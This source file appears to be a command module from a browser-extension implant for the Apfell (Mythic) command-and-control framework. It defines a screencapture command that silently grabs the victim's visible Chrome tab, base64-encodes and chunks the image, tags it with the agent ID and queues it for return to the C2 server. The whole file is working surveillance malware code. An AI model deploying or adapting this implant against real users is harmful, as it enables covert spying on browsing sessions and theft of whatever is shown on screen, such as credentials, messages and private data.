screencapture = function(task){
    chrome.tabs.captureVisibleTab(null, function(img) {
        
        if (img === undefined) {
            let response = {'task_id':task.task_id, 'user_output': 'screencapture failed', 'completed': false, 'status':'error'};
            let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            let enc = JSON.stringify(outer_response);
            let final = apfell.apfellid + enc;
            let msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
        } else {
            let encImg = img.toString().split(',')[1];
            let raw = atob(encImg);
            let totalchunks = Math.ceil(raw.length / 512000);
            let response = {'total_chunks':totalchunks, 'task_id':task.task_id, 'full_path':task.parameters};
            let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            let enc = JSON.stringify(outer_response);
            let final = apfell.apfellid + enc;
            let msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
            
            screencaptures.push({'type':'screencapture','task_id':task['task_id'], 'image':raw, 'total_chunks': totalchunks});
        }

    });
};

C2.commands[screencapture.name] = screencapture;
COMMAND_ENDS_HERE
